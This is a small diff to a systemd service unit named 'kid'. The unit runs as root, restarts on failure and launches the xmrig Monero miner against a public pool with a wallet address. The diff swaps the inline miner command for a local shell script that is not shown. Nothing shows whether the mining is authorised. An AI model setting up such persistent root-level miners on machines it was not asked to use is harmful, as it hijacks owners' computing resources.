@@ -13,7 +13,7 @@ Description=kid
 After=network.target
 [Service]
 Type=forking
-ExecStart=/bin/sh -c 'cd /usr/local/src/xmrig/build/ && ./xmrig --coin=monero -B -R 10 -o stratum+tcp://pool.supportxmr.com:5555 -u 47UbkYwirtqPGximU3ipvdbrfYBxQatB5WQXGWbvUusUXwKVE4QhEWtg6MqjQUZfpN9UoQgYcPDV8X1roPy7shmBH9Pmt9V -p x -k'
+ExecStart=/usr/local/src/suxmr-1-link1.sh
 Restart=on-failure
 RestartSec=60
 User=root
